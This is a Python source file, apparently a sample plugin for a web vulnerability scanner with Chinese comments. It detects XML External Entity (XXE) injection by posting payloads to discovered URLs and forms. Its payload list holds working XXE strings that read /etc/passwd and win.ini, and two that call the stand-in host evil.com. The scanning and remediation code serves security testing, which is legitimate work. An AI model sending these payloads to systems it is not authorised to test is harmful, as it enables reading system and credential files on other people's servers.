# 示例插件: XXE(XML External Entity)检测器

from typing import Dict, List, Optional
from core.utils.logger import Logger


class XXEDetector:
    """XXE (XML External Entity) 检测器 - 插件示例"""
    
    def __init__(self, target: str, http, urls: Optional[List] = None,
                 forms: Optional[List] = None, **kwargs):
        """
        初始化XXE检测器
        
        Args:
            target: 扫描目标URL
            http: HTTP工具实例
            urls: 爬虫发现的URL列表
            forms: 爬虫发现的表单列表
        """
        self.name = "XXE(XML外部实体)"
        self.target = target
        self.http = http
        self.urls = urls or [target]
        self.forms = forms or []
        self.logger = Logger()
        
        # XXE payloads
        self.payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///windows/win.ini">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "http://evil.com">]><data>&file;</data>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://evil.com"> %xxe;]><root></root>',
        ]
    
    def scan(self) -> List[Dict]:
        """
        扫描XXE漏洞
        
        Returns:
            发现的漏洞列表
        """
        vulnerabilities = []
        
        self.logger.info("开始XXE漏洞检测...")
        
        # 测试所有发现的URL
        for url in self.urls[:20]:
            # 只对可能接受XML的端点进行测试
            if self._is_xml_endpoint(url):
                vulns = self._test_url(url)
                vulnerabilities.extend(vulns)
        
        # 测试POST表单
        for form in self.forms[:10]:
            if form.get('method', 'GET').upper() == 'POST':
                vulns = self._test_form(form)
                vulnerabilities.extend(vulns)
        
        return self._deduplicate_vulns(vulnerabilities)
    
    def _is_xml_endpoint(self, url: str) -> bool:
        """判断端点是否可能接受XML"""
        xml_indicators = ['.xml', 'api', 'soap', 'xmlrpc', 'webhook']
        return any(indicator in url.lower() for indicator in xml_indicators)
    
    def _test_url(self, url: str) -> List[Dict]:
        """测试单个URL"""
        vulnerabilities = []
        
        for payload in self.payloads:
            response = self.http.post(
                url,
                data=payload,
                headers={'Content-Type': 'application/xml'}
            )
            
            if response and self._check_xxe_response(response.text):
                vulnerabilities.append({
                    'type': 'XXE(XML外部实体注入)',
                    'severity': '高危',
                    'url': url,
                    'parameter': 'POST Body',
                    'method': 'POST',
                    'payload': payload[:100] + '...',
                    'description': f"URL {url} 可能存在XXE漏洞",
                    'recommendation': "禁用XML外部实体处理,使用JSON代替XML,或配置XML解析器拒绝DTD。"
                })
                break
        
        return vulnerabilities
    
    def _test_form(self, form: Dict) -> List[Dict]:
        """测试表单"""
        vulnerabilities = []
        form_action = form.get('action', self.target)
        
        for payload in self.payloads:
            response = self.http.post(
                form_action,
                data=payload,
                headers={'Content-Type': 'application/xml'}
            )
            
            if response and self._check_xxe_response(response.text):
                vulnerabilities.append({
                    'type': 'XXE(XML外部实体注入)',
                    'severity': '高危',
                    'url': form_action,
                    'parameter': 'POST Body',
                    'method': 'POST',
                    'payload': payload[:100] + '...',
                    'description': f"表单 {form_action} 可能存在XXE漏洞",
                    'recommendation': "禁用XML外部实体处理,使用JSON代替XML。"
                })
                break
        
        return vulnerabilities
    
    def _check_xxe_response(self, response_text: str) -> bool:
        """检查XXE响应特征"""
        xxe_indicators = [
            'root:',
            '[boot loader]',
            'operating systems',
            'for 16-bit app support',
        ]
        
        response_lower = response_text.lower()
        return any(indicator.lower() in response_lower for indicator in xxe_indicators)
    
    def _deduplicate_vulns(self, vulnerabilities: List[Dict]) -> List[Dict]:
        """去重"""
        seen = set()
        unique_vulns = []
        
        for vuln in vulnerabilities:
            key = (vuln['url'], vuln['type'])
            if key not in seen:
                seen.add(key)
                unique_vulns.append(vuln)
        
        return unique_vulns
